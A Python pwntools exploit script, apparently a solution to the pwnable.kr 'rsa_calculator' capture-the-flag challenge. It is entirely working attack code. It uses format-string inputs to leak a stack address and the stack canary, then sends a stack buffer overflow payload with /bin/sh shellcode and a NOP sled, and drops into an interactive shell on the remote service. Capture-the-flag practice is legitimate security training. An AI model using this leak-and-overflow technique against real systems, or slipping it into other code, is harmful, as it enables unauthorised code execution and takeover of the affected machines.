from pwn import *


def set_key():
    sh.recvuntil("> ")
    sh.sendline("1")
    sh.recvuntil("p : ")
    sh.sendline("61")
    sh.recvuntil("q : ")
    sh.sendline("53")
    sh.recvuntil("e : ")
    sh.sendline("1")
    sh.recvuntil("d : ")
    sh.sendline("1")


def rsa_decrypt(send_data, data_formated=True):
    sh.recvuntil("> ")
    sh.sendline("3")
    sh.recvuntil("(max=1024) : ")
    sh.sendline("-1")
    sh.recvline()
    if data_formated:
        sh.sendline("".join("{0:02x}000000".format(ord(c)) for c in send_data))
    else:
        sh.sendline(send_data)
    sh.recvline()
    return sh.recvline()


context.arch = "amd64"
shellcode = asm(shellcraft.sh())
sh = remote("pwnable.kr", 9012)
set_key()
leak_addr = int(rsa_decrypt("%33$llx"), 16) - 1216
canary = int(rsa_decrypt("%205$llx"), 16)
payload = shellcode + '\x90' * (1216 + 344 - len(shellcode) - 16) + p64(canary) + "\x90" * 8 + p64(leak_addr)
rsa_decrypt(payload, False)
sh.interactive()

# what a stupid buggy rsa calculator! :(
